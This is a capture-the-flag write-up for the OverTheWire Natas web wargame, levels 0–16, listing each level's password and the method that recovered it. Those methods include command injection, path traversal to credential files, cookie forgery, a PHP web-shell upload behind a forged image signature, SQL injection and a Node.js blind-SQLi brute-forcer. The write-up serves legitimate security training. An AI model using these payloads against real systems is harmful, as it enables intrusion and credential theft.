# Natas Solutions

http://natas0.natas.labs.overthewire.org

### Level 0 `natas0`
- Second Click. Inspect Element.
- Password for next level is hidden in comments in div#content.

### Level 1 `gtVrDuiDfck831PqWsLEZy5gyDz1clto`
- Ctrl+Shift+I
- Password for next level is hidden in comments in div#content.

### Level 2 `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`
- Ctrl+Shift+I
- There's a file used in div#content at /files/pixel.png. So we try going to /files
- We see a users.txt in which there's the password for next level.

### Level 3 `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`
- Apparently there's a file called robots.txt which prevents web crawlers/bots to index certain pages/routes. So we try to open that (/robots.txt).
- Here we see a diallowed path (/s3cr3t/). We go there and open the users.txt file to get the password for the next level.

### Level 4 `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`
- Go to natas5 page.
- Cancel the credentials alert.
- Open console.
```javascript
window.location = "http://natas4.natas.labs.overthewire.org/"
```
- Press Enter

### Level 5 `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`
- Open DevTools (Application tab)
- Open cookies. There's a variable with name "loggedin" and value 0.
- Change that value to 1.
- The password appears.

### Level 6 `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`
- Click on View Source
- There's a little PHP code, understand what it does.
- open the file /includes/secret.inc
- copy the secret value and paste it in the input box.
- It gives the password.

### Level 7 `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`
- Open dev tools to find out that the index.php?path=[path_name] opens the file at path name.
- See the hint that tells the location of the file where the password is stored. (/etc/natas_webpass/natas8)
- Open this file with index.php (/index.php?page=/etc/natas_webpass/natas8)

### Level 8 `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`
- Click on View Source. Understand the PHP Code.
- We realise that we need to find the: 
```php
base64_decode(strrev(hex2bin( "3d3d516343746d4d6d6c315669563362" )));
```
- It is "oubWYf2kBq"
- Paste this in input box.
- It gives the password.

### Level 9 `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`
- Open the source code and understand what php is doing.
- We see that php is clearly running the command directly we enter in it's shell between "grep -i " and " dictionary.txt"
- At the first look it looks like we'll find the password in dictionary.txt, but we wont.
- We can directly get it from /etc/natas_webpass/
- So we enter this in the textbox;
```
; cat /etc/natas_webpass/natas10;
```
- And we get the password for level 10.

### Level 10 `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`
- Read php part of source-code to understand which characters are not allowed.
```
-e "." /etc/natas_webpass/natas11 #
```

### Level 11 `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`
- Understand the PHP code.
- We see that there is no way we can give any input from HTML that could change the variable `showpassword` in PHP, unless we change the cookie value itself.
- To change the cookie value though, we need the secret key. Which we can get because of the following XOR property
```
If A^B = C,
Then A^C = B = C^A
And B^C = A = C^B
```
- So we use the following PHP code to find the key (and verify that it is actually the correct key):
- ***Notice that we've replaced URL encoded "%3D" (in cookie value) to ASCII "="***
```php
<?php

function xor_encrypt($in, $ke) {
    $key = $ke;
    $text = $in;
    $outText = '';
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}

$cook = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
$mykey = base64_decode($cook);
$actualkey = xor_encrypt(json_encode($defaultdata), $mykey);
print $actualkey;
print " --- ";
print base64_encode(xor_encrypt(json_encode($defaultdata), $actualkey));
?>

// Outputs: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq --- ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
```
- Based on the output `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`, it can be assumed that the secret key is `qw8J`.
- Now we generate an xor-encrypted cookie value using this secret key, in which showpassword's value is "yes", using the following PHP code:
```php
<?php
function xor_encrypt($in, $ke) {
    $key = $ke;
    $text = $in;
    $outText = '';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}

$actualkey = "qw8J";
$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#00ff00");
print base64_encode(xor_encrypt(json_encode($defaultdata), $actualkey));

// Outputs - ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVAh6FxEIelMK
?>
```
- We replace the cookie value in dev-tools and refresh.

### Level 12 `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`
- We see that we can upload a file then open it.
- Also we can change the extension of uploaded the file by changing the hidden input tag (filename).
- So we'll create a php file (that executes a system command and echos the result):
```
echo "<?php echo system(\"cat /etc/natas_webpass/nats13\"); ?>" > script.php
```
- We'll change the upload file type to php by changing the "value" of the input tag -> "filename".
- We'll upload the script.php file and open the link.
- We get the password.

### Level 13 `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`
- We see that there's a php function `exif_imagetype` being used to verify the file we upload.
- We google to see what it does and find out that it "reads the first bytes of an image and checks its signature".
- We find the signature of jpg file from [wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures): `FF D8 FF E0 00 10 4A 46 49 46 00 01`.
- We create our own file:
```
echo -e '\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01 --- <?php echo system("cat /etc/natas_webpass/natas14"); ?>' > test
```
- We'll change the upload file type to php by changing the "value" of the input tag -> "filename".
- We upload the test file and open the php page link to get the password.

### Level 14 `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`
- We see that a query is created the values we enter in the textboxes.
- In the form's action property, we change the value from "index.php" to "index.php?debug=1" to trigger the sql output.
- We enter `natas" or username like "%" -- ` in username box and nothing in password is required because the rest of the query is commented.
- The following query gets executed:
```sql
SELECT * from users where username="natas" or username like "%" -- " and password=""
```
- We get the password.

### Level 15 `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`
- The php code basically checks for the presence of a user in the database. What's different is that this time we're given the table name and column names as well.
- Since there's other info available we try for the user `natas16` and we actually see that this user exists.
- Again due to the lack of possiblities, it is safe to assume that the password associated with user `natas16` is actuall the password for the next level.
- Since there's no way to actually get the output of the SQL Query (other than a boolean of wheather user exists or not) we have to brute-force the password out of the database.
- I'm brute-forcing it with Node.js:
```javascript
const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

const headers = {
    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
}
async function req(ch) {
    const res = await axios.post('http://natas15.natas.labs.overthewire.org/index.php', `username=natas16%22+and+password+like+binary+%22${ch}%25`, {headers});
    if(res.data.includes('This user exists.')) {
        return true;
    } else {
        return false;
    }
}

async function calc() {
    const alphanum = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890';
    let ans = '';
    
    for(let i=0; i<alphanum.length; i++) {
        let val = await req(ans + alphanum[i]);
        if(val) {
            ans += alphanum[i];
            console.log(ans);
            i = -1;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));

// Outputs
// Example app listening at http://localhost:3000
// W
// Wa
// WaI
// WaIH
// WaIHE
// WaIHEa
// WaIHEac
// WaIHEacj
// WaIHEacj6
// WaIHEacj63
// WaIHEacj63w
// WaIHEacj63wn
// WaIHEacj63wnN
// WaIHEacj63wnNI
// WaIHEacj63wnNIB
// WaIHEacj63wnNIBR
// WaIHEacj63wnNIBRO
// WaIHEacj63wnNIBROH
// WaIHEacj63wnNIBROHe
// WaIHEacj63wnNIBROHeq
// WaIHEacj63wnNIBROHeqi
// WaIHEacj63wnNIBROHeqi3
// WaIHEacj63wnNIBROHeqi3p
// WaIHEacj63wnNIBROHeqi3p9
// WaIHEacj63wnNIBROHeqi3p9t
// WaIHEacj63wnNIBROHeqi3p9t0
// WaIHEacj63wnNIBROHeqi3p9t0m
// WaIHEacj63wnNIBROHeqi3p9t0m5
// WaIHEacj63wnNIBROHeqi3p9t0m5n
// WaIHEacj63wnNIBROHeqi3p9t0m5nh
// WaIHEacj63wnNIBROHeqi3p9t0m5nhm
// WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
// fin
```
- This solution can further be improved (made faster) by two ways:
    - binary-searching for characters (using strcmp function in sql)
    - Finding all the characters present in the password beforehand (by using %ch%)

### Level 16 `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`
- 

### Level 17 ``

### Level 18 ``

### Level 19 ``

